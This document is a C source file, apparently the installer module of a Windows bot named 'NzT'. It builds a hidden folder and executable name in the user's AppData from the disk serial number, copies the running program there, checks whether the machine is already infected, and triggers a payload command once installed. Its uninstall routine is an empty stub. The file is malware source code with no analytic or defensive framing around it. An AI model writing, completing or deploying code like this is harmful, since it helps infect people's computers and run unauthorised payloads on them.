#include <Windows.h>

#include "install.h"
#include "nzt.h"
#include "crt.h"
#include "utils.h"
#include "config.h"
#include "globals.h"
#include "file.h"
#include "registry.h"
#include "command.h"

static DWORD GenerateBotFileName(PDWORD Seed)
{
    if (Seed == NULL) return 0;
    return (*Seed = 1664525 * (*Seed));
}

LPWSTR GetBotFileName(PDWORD Seed)
{
    DWORD FileName = 0,
          FileNameLength = 0;
    wchar_t FileNameString[32] = { 0 };

    if (Seed == NULL) return NULL;

    FileName = GenerateBotFileName(Seed);

    MemoryZero(&FileNameString, sizeof(FileNameString));

    if ((FileNameLength = API(wsprintfW)(FileNameString, L"%x", FileName)) > 0)
        return StringCopyW(FileNameString, FileNameLength);

    return NULL;
}

LPWSTR GetBotDirectory()
{
    LPWSTR AppData = NULL,
           DirectoryName = NULL;
    BOOL Status = FALSE;

    DWORD serialNum = GetSerialNumber();
    if ((DirectoryName = GetBotFileName(&serialNum)) == NULL)
        return NULL;

    if ((AppData = GetDirectoryPath(PATH_APPDATA)) != NULL)
        Status = StringConcatW(&AppData, DirectoryName);

    Free(DirectoryName);

    if (!Status)
    {
        Free(AppData);
        AppData = NULL;
    }

    return AppData;
}

LPWSTR GetBotPath()
{
    LPWSTR Directory = NULL,
           FileName = NULL;
    BOOL Status = FALSE;

    DWORD serialNum = GetSerialNumber();
    if ((FileName = GetBotFileName(&serialNum)) == NULL)
        return NULL;

    if ((Directory = GetBotDirectory()) != NULL)
    {
        Status = StringConcatW(&Directory, WSTRING_BACKSLASH) && 
                 StringConcatW(&Directory, FileName) &&
                 StringConcatW(&Directory, WSTRING_DOT_EXE);
    }

    Free(FileName);

    if (!Status)
    {
        Free(Directory);
        Directory = NULL;
    }

    return Directory;
}

BOOL IsSystemInfected()
{
    BOOL Infected = FALSE;
    LPWSTR Path = NULL;

    if ((Path = GetBotPath()) == NULL)
        return FALSE;
    
    Infected = StringCompareW(g_BotInstallPath, Path);

    Free(Path);
    return Infected;
}

BOOL InstallBot()
{
    LPWSTR Path = NULL,
           Directory = NULL;

    if ((Directory = GetBotDirectory()) == NULL)
        return FALSE;

    Path = GetBotPath();
    if (Path != NULL)
    {
        DosPathToNtPath(&Path);
        DosPathToNtPath(&Directory);

        if (FileCreateDirectory(Directory))
        {
            DosPathToNtPath(&g_CurrentProcessPath);
            FileCopy(g_CurrentProcessPath, Path, TRUE);
            DebugPrintW(L"NzT: Install location: %ls", Path);
            g_BotInstallPath = Path;

            CommandExecute(COMMAND_RUN_PAYLOAD, NULL);

            Free(Directory);
            return TRUE;
        }
    }

    DebugPrintW(L"NzT: Failed to install at: %ls", Path ? Path : L"");

    Free(Path);
    Free(Directory);
    return FALSE;
}

BOOL UninstallBot()
{
    LPWSTR Path = NULL,
           Directory = NULL;

    // TODO: Implement uninstallation logic
    return FALSE;
}

